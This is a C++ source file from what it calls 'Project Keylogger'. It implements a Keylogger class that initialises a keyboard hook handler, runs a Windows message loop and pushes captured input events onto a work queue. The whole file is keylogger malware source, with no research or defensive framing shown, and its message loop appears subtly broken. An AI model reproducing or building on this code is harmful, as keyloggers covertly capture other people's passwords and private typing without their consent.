/**
* Project Keylogger
*/

#include "keylogger_dll/Keylogger.h"

/**
* Keylogger implementation
*/
Keylogger::Keylogger(WorkQueue& wqueue) : _eventManager(*(new EventManager(*this))), _hookHandler(*(new HookHandler(_eventManager))), IKeylogger(), _levents(wqueue) {
	_running = false;
}

Keylogger::~Keylogger()
{
	if (_running)
	{
		if (!this->stop())
		{
			std::cout << "Stop error." << std::endl;
		}
	}
}


/**
* @return bool
*/
bool Keylogger::init() {
	if (!_hookHandler.init())
		return false;
	return true;
}

/**
* @return void
*/
bool Keylogger::run() {
	MSG msg;
	_running = true;
	while (!PeekMessage(&msg, NULL, 0, 0, 0) && _running)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	_running = false;
	return true;
}

/**
* @return bool
*/
bool Keylogger::stop() {
	_running = false;
	return _hookHandler.stop();
}

/**
* @return bool
*/
bool Keylogger::kill() {
	return false;
}

/**
* @param AEvent*
* @return bool
*/
bool Keylogger::pushToQueue(const AEvent* event) {
	this->_levents.add_elem((void*)event);
	return true;
}